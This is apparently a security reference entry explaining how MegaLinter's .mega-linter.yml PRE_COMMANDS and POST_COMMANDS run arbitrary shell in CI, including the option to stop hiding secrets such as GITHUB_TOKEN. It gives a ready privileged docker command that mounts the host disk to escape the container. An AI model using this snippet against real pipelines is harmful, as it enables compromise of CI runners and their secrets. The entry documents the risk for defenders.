---
title: oxsecurity/megalinter
tags:
- github-actions
- config-file
- eval-sh
references:
- https://github.com/oxsecurity/megalinter/
files: [.mega-linter.yml]
purl: pkg:githubactions/oxsecurity/megalinter
---

MegaLinter's default configuration file is `.mega-linter.yml` and can execute additional commands before and after the linters run.

```yaml
PRE_COMMANDS:
  - command: |
      echo "This is MegaLinter PRE_COMMAND on own MegaLinter ! :)"
    cwd: workspace        # runs in the repository folder
    secured_env: false    # True by default, but if defined to false, no global variable will be hidden (for example if you need GITHUB_TOKEN)

POST_COMMANDS:
  - command: |
      echo "This is MegaLinter POST_COMMAND on own MegaLinter ! :)"
    cwd: root             # runs at the root folder
```

Because the MegaLinter GitHub Actions runs in a container as root and mounts the Docker daemon socket (`/var/run/docker.sock`) inside the container, it is trivial to escape the container. In hosted GitHub Actions runners, the device `/dev/sda1` is the root filesystem and can be mounted in a privileged container to read/write files on the host.

```yaml
PRE_COMMANDS:
  - command: |
      docker run --privileged alpine:latest sh -c 'mount /dev/sda1 /mnt; ls -la /mnt/home/runner/work/*/*'
    cwd: root
````
